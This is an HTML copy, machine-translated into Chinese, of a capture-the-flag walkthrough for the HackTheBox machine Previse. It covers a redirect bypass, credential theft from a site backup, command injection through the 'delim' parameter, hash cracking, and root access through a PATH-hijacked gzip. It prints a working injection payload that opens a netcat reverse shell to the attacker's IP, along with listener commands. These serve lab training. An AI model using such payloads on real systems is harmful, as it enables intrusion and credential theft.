<html>
<head>
<title>Previse from HackTheBox — Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">从黑客盒子预览-详细演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/previse-from-hackthebox-detailed-walkthrough-97ece9bba884?source=collection_archive---------1-----------------------#2021-12-21">https://infosecwriteups.com/previse-from-hackthebox-detailed-walkthrough-97ece9bba884?source=collection_archive---------1-----------------------#2021-12-21</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="eb6c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">展示完成盒子所需的所有工具和技术。</p><h1 id="1886" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">机器信息</h1><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/db70010da163111627ff3656256b08f2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*n0k_Np5hqAZ2S3G3.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">来自黑客盒子的预览</figcaption></figure><p id="86f2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Previse在HackTheBox上被评为简易机。初步扫描显示只有两个开放的端口。我们从80端口看网站开始，通过枚举找到隐藏文件。我们通过更改响应代码来访问帐户创建页面，然后使用新获得的访问权限下载备份文件。代码审查揭示了网站中的一个漏洞，我们通过篡改参数来获得反向外壳。从MySQL转储的凭证被破解，并被用来作为用户登录。然后利用脚本中未加引号的路径获得根外壳。</p><p id="2a5b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所需的技能是网络和操作系统枚举。学到的技能是改变响应代码和参数篡改。</p><div class="lv lw gp gr lx ly"><a href="https://www.hackthebox.com/home/machines/profile/373" rel="noopener  ugc nofollow" target="_blank"><div class="lz ab fo"><div class="ma ab mb cl cj mc"><h2 class="bd ir gy z fp md fr fs me fu fw ip bi translated">破解盒子::渗透测试实验室— Previse</h2><div class="mf l"><h3 class="bd b gy z fp md fr fs me fu fw dk translated">登录Hack The Box平台，让您的笔测试和网络安全技能更上一层楼！</h3></div><div class="mg l"><p class="bd b dl z fp md fr fs me fu fw dk translated">www.hackthebox.com</p></div></div><div class="mh l"><div class="mi l mj mk ml mh mm lp ly"/></div></div></a></div><h1 id="a4b2" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">初步侦察</h1><p id="f8fb" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">像往常一样，让我们从Nmap开始:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ms"><img src="../Images/90b5621de91bfa3dc8d080d199c6651f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KvN2r0F3xXiZuRbrAqFL2g.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Nmap扫描</figcaption></figure><p id="dc9d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">目前，我们从nmap扫描中得到的只是一个端口80上的网站:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi mx"><img src="../Images/76ab2e438c8407455906f811be382f0e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1220/format:webp/0*ctxWvVk63PK_pmi8.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">预览文件存储</figcaption></figure><h1 id="e5b6" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">文件发现</h1><p id="dfb3" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">这是一个简单的静态登录页面。源代码中没有什么有趣的东西，feroxbuster的时间到了:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi my"><img src="../Images/0f50c7d3285914c4b6a998d5e0883c85.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nCuF_FHyoZpyGkf7H6ZQQg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">对php文件进行Feroxbuster扫描</figcaption></figure><p id="1717" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们已经找到了一些php文件。翻看那些有200个响应代码的，只有nav.php是有趣的:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi mz"><img src="../Images/07a29e350e278cc13ff52900f937efdc.png" data-original-src="https://miro.medium.com/v2/resize:fit:724/format:webp/0*Ptd-K_Cp-2GMlykr.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">nav.php文件的内容</figcaption></figure><h1 id="5f51" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">更改响应代码</h1><p id="06bb" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">所有链接都将我们重定向到登录页面，但如果我们单击创建帐户链接并使用Burp拦截，则设置为拦截响应:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi na"><img src="../Images/473f6102b33456fc22471b6decb79c20.png" data-original-src="https://miro.medium.com/v2/resize:fit:1300/format:webp/0*TK8vtdGGECAWvOQx.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">打嗝拦截创建帐户响应</figcaption></figure><p id="f083" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，当我们单击forward发送get请求时，我们捕获到以下响应:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="93ef" class="ng km iq nc b gy nh ni l nj nk">HTTP/1.1 302 Found<br/>Date: Wed, 29 Sep 2021 20:08:28 GMT<br/>Server: Apache/2.4.29 (Ubuntu)<br/>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br/>Cache-Control: no-store, no-cache, must-revalidate<br/>Pragma: no-cache<br/>Location: login.php<br/>Content-Length: 3994<br/>Connection: close<br/>Content-Type: text/html; charset=UTF-8</span></pre><p id="7748" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里描述了302发现响应<a class="ae nl" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302" rel="noopener ugc nofollow" target="_blank"/>:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="06fa" class="ng km iq nc b gy nh ni l nj nk">The HyperText Transfer Protocol (HTTP) 302 Found redirect status<br/>response code indicates that the resource requested has been<br/>temporarily moved to the URL given by the Location header.</span></pre><p id="46ef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，我们将被重定向到login.php，但我们可以将响应代码改为200 OK:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="f72c" class="ng km iq nc b gy nh ni l nj nk">HTTP/1.1 200 OK<br/>Date: Wed, 29 Sep 2021 20:08:28 GMT<br/>Server: Apache/2.4.29 (Ubuntu)<br/>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br/>Cache-Control: no-store, no-cache, must-revalidate<br/>Pragma: no-cache<br/>Location: login.php<br/>Content-Length: 3994<br/>Connection: close<br/>Content-Type: text/html; charset=UTF-8</span></pre><p id="41de" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，当我们以打嗝方式发送响应时，我们可以切换回浏览器查看accounts.php页面:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nm"><img src="../Images/7e6129bfe196f286ead0635115c8b2ea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1156/format:webp/0*KKbgodvx4rGLzchr.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">绕过302重定向登录</figcaption></figure><h1 id="677e" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">帐户创建</h1><p id="981c" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们可以创建一个帐户，然后登录，这将使我们转到这里:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/3031875fb0ff4e509812393045a3a9c8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1150/format:webp/0*UVxC333tn5Stk5Ll.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">登录到管理页面</figcaption></figure><p id="d9c8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">点击我找到了文件页面:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi no"><img src="../Images/bc60d20c8b986f61a2f6f408ddde8a8a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1216/format:webp/0*zzFbUKanXbL5aD76.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">管理区的文件部分</figcaption></figure><h1 id="8ef6" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">备份文件</h1><p id="3bf1" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">下载备份文件并提取内容可以从网站上获取所有文件:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="5fbe" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~/htb/previse]<br/>└─# unzip siteBackup.zip <br/>Archive:  siteBackup.zip<br/>  inflating: accounts.php            <br/>  inflating: config.php              <br/>  inflating: download.php            <br/>  inflating: file_logs.php           <br/>  inflating: files.php               <br/>  inflating: footer.php              <br/>  inflating: header.php              <br/>  inflating: index.php               <br/>  inflating: login.php               <br/>  inflating: logout.php              <br/>  inflating: logs.php                <br/>  inflating: nav.php                 <br/>  inflating: status.php</span></pre><p id="b44e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我的目光被config.php的文件吸引住了，这里面包含着凭据:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="f22e" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~/htb/previse]<br/>└─# cat config.php <br/>&lt;?php<br/>function connectDB(){<br/>    $host = 'localhost';<br/>    $user = 'root';<br/>    $passwd = '&lt;HIDDEN&gt;';<br/>    $db = 'previse';<br/>    $mycon = new mysqli($host, $user, $passwd, $db);<br/>    return $mycon;<br/>}<br/>?&gt;</span></pre><p id="00f1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">日志文件也很有趣:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi np"><img src="../Images/710cee3a7ce5ce95e4f4e2cbf14df682.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Rz3HcpsxHUqMiq8AhGhLgQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">logs.php文件的内容</figcaption></figure><p id="6c9f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到，该脚本使用exec函数调用python，然后python执行一个python脚本，并从用户那里获取参数delim。我们可以从命令行对此进行测试:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nq"><img src="../Images/d826659fe456e1bbb5e8c80b5c1f3462.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WmNvAyraHDXDXXbtA1KytA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">测试logs.php文件的参数</figcaption></figure><h1 id="2b40" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">参数篡改</h1><p id="7d1b" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们可以看到这是可行的，我得到了逗号分隔的列表。我们可以滥用这种消毒输入的缺乏来获得一个反向外壳。在另一个终端中启动netcat侦听，然后使用URL编码的简单反向shell:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="aec2" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~/htb/previse]<br/>└─# curl -v --cookie "PHPSESSID=1ovoh21p24c94mggubgc3j16dn" -d delim=comma%26nc+-e+/bin/sh+10.10.14.214+1337 http://previse.htb/logs.php <br/>*   Trying 10.10.11.104:80...<br/>* Connected to previse.htb (10.10.11.104) port 80 (#0)<br/>&gt; POST /logs.php HTTP/1.1<br/>&gt; Host: previse.htb<br/>&gt; User-Agent: curl/7.74.0<br/>&gt; Accept: */*<br/>&gt; Cookie: PHPSESSID=1ovoh21p24c94mggubgc3j16dn<br/>&gt; Content-Length: 45<br/>&gt; Content-Type: application/x-www-form-urlencoded<br/>&gt; <br/>* upload completely sent off: 45 out of 45 bytes</span></pre><p id="54db" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">切换到我们等待的netcat监听器，我们看到我们已经连接了我们的shell:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="8970" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~/htb/previse]<br/>└─# nc -nlvp 1337<br/>listening on [any] 1337 ...<br/>connect to [10.10.14.214] from (UNKNOWN) [10.10.11.104] 48260</span></pre><p id="a932" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们先升级到更好的外壳:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="0beb" class="ng km iq nc b gy nh ni l nj nk">python -c 'import pty;pty.spawn("/bin/bash")'<br/>www-data@previse:/var/www/html$</span></pre><h1 id="40cc" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">MySQL枚举</h1><p id="ad6a" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们仅作为低权限用户进行连接，但之前我们发现了mysql凭据，因此我们可以查看数据库:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nr"><img src="../Images/7fc86905b2cb0cb5b4aa596ecfadc361.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_Y0gwWcwW7AjpP4gl3r_Jw.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">枚举MySQL以转储密码哈希</figcaption></figure><h1 id="083e" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">哈希破解</h1><p id="ae5a" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们有用户和密码散列。第一个名为m4l的用户之前在网站上被视为创建者，让我们获取该散列，看看我们能否破解它:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="5261" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~/htb/previse]<br/>└─# echo "\$1\$🧂llol&lt;HIDDEN&gt;" &gt; hash.txt</span></pre><p id="4b33" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用<a class="ae nl" href="https://vk9-sec.com/cracking-password-john-the-ripper/" rel="noopener ugc nofollow" target="_blank">这个</a>站点来识别哈希类型，即md5:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="041a" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~/htb/previse]<br/>└─# john hash.txt -format=md5crypt-long -w=/usr/share/wordlists/rockyou.txt<br/>Using default input encoding: UTF-8<br/>Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])<br/>Will run 4 OpenMP threads<br/>Press 'q' or Ctrl-C to abort, almost any other key for status<br/>&lt;HIDDEN&gt; (?)<br/>1g 0:00:06:16 DONE (2021-09-29 22:17) 0.002653g/s 19671p/s 19671c/s 19671C/s ilovecodydean..ilovecody..<br/>Use the "--show" option to display all of the cracked passwords reliably<br/>Session completed</span></pre><h1 id="3de9" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">用户标志</h1><p id="5004" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">现在我们有了可以通过SSH登录的凭证:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="56ed" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~/htb/previse]<br/>└─# ssh m4lwhere@previse.htb                        <br/>The authenticity of host 'previse.htb (10.10.11.104)' can't be established.<br/>ECDSA key fingerprint is SHA256:rr7ooHUgwdLomHhLfZXMaTHltfiWVR7FJAe2R7Yp5LQ.<br/>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br/>Warning: Permanently added 'previse.htb,10.10.11.104' (ECDSA) to the list of known hosts.<br/>m4lwhere@previse.htb's password: <br/>Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)<br/>Last login: Wed Sep 29 18:53:44 2021 from 10.10.14.191<br/>m4lwhere@previse:~$</span></pre><p id="f43a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们抓住用户标志:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="496b" class="ng km iq nc b gy nh ni l nj nk">m4lwhere@previse:~$ cat user.txt<br/>&lt;HIDDEN&gt;</span></pre><h1 id="6146" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">权限提升</h1><p id="6443" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我首先检查的是sudo权限:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="c7c2" class="ng km iq nc b gy nh ni l nj nk">m4lwhere@previse:~$ sudo -l<br/>[sudo] password for m4lwhere: <br/>User m4lwhere may run the following commands on previse:<br/>    (root) /opt/scripts/access_backup.sh<br/>m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh</span></pre><p id="dcf0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">毫不奇怪，我们找到了升级路径。看着剧本:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="971a" class="ng km iq nc b gy nh ni l nj nk"># We always make sure to store logs, we take security SERIOUSLY here<br/><br/># I know I shouldnt run this as root but I cant figure it out programmatically on my account<br/># This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time<br/><br/>gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz<br/>gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz</span></pre><p id="165b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们看到它只是压缩日志，但是没有gzip可执行文件的路径，所以我们可以创建自己的gzip文件并使用它:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ns"><img src="../Images/580d3a04437e7a4df6d980293e13d6cb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*keyhjgIbZrQthDQy2e5Yog.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">利用路径错误配置创建我们自己的gzip</figcaption></figure><p id="5702" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这里，我们刚刚在当前文件夹中创建了一个名为gzip的文件，其中有一个反向shell。然后我使它可执行，并将当前文件夹添加到系统路径中。</p><h1 id="1515" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">根标志</h1><p id="6c36" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">现在，我们可以以root用户身份运行备份脚本，另一个netcat在另一个终端中等待:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="92dc" class="ng km iq nc b gy nh ni l nj nk">m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh</span></pre><p id="b865" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">切换时，我们看到我们的shell以root用户身份连接:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="b175" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~]<br/>└─# nc -nlvp 4444<br/>listening on [any] 4444 ...<br/>connect to [10.10.14.214] from (UNKNOWN) [10.10.11.104] 55386<br/>root@previse:~# id <br/>id<br/>uid=0(root) gid=0(root) groups=0(root)</span></pre><p id="572f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以抓住根标志:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="c142" class="ng km iq nc b gy nh ni l nj nk">root@previse:~# cat /root/root.txt<br/>cat /root/root.txt<br/>&lt;HIDDEN&gt;</span></pre><p id="21e0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是另一个完成的盒子。我希望你喜欢这个非常简单的。下次见。</p></div><div class="ab cl nt nu hu nv" role="separator"><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny"/></div><div class="ij ik il im in"><p id="25f8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你喜欢这篇文章，请给我一两个掌声。</p><p id="5926" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">推特—<a class="ae nl" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>网站— <a class="ae nl" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="72b8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="oa">原载于2021年12月21日</em><a class="ae nl" href="https://pencer.io/ctf/ctf-htb-previse" rel="noopener ugc nofollow" target="_blank"><em class="oa">https://pencer . io</em></a><em class="oa">。</em></p></div></div>    
</body>
</html>